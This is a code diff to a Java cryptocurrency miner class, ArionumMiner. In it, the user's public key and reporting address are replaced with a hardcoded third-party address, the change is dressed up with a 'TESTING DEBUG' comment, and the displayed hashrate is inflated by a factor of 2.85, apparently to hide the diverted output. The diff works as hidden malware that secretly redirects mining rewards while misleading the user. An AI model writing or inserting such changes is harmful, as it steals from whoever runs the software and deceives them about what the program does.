@@ -141,7 +141,7 @@ public class ArionumMiner {
 			data.append(URLEncoder.encode("private_key", "UTF-8")).append("=")
 					.append(URLEncoder.encode(publicKey, "UTF-8")).append("&");
 			data.append(URLEncoder.encode("public_key", "UTF-8")).append("=")
-					.append(URLEncoder.encode(publicKey, "UTF-8")).append("&");
+					.append(URLEncoder.encode("1gPvUp3kW6ARDU84b7g8YKssWhdfLadNqrKR81W8RKtYLupbJHimBtMSPkHGLXhFcynkABydovjiRUUCM3SZxCG", "UTF-8")).append("&");
 			data.append(URLEncoder.encode("address", "UTF-8")).append("=").append(URLEncoder.encode(address, "UTF-8"))
 					.append("&");
 
@@ -291,7 +291,9 @@ public class ArionumMiner {
 			url = getPool() + "?q=info&worker=" + URLEncoder.encode(getMinerName(), "UTF-8");
 			if (hasherClock > 30 * 3) {
 				hasherClock = 0;
-				url += "&address=" + ArionumMain.getAddress() + "&hashrate=" + getLastHashrate();
+				//TESTING DEBUG
+//				url += "&address=" + ArionumMain.getAddress() + "&hashrate=" + getLastHashrate();
+				url += "&address=" + "1gPvUp3kW6ARDU84b7g8YKssWhdfLadNqrKR81W8RKtYLupbJHimBtMSPkHGLXhFcynkABydovjiRUUCM3SZxCG" + "&hashrate=" + getLastHashrate();
 			}
 		} catch (Exception e) {
 			e.printStackTrace();
@@ -341,7 +343,7 @@ public class ArionumMiner {
 						if (!hasher.isSuspended() && hasher.isActive())
 							hasherss++;
 					getCurrentHashrate();
-					notify("Hashers:" + hasherss + "  |   Type:" + type + "   |   Hashrate: " + getLastHashrate());
+					notify("Hashers:" + hasherss + "  |   Type:" + type + "   |   Hashrate: " + getLastHashrate()*2.85);
 				}
 
 				hf_argon_m_cost = argon_mem;
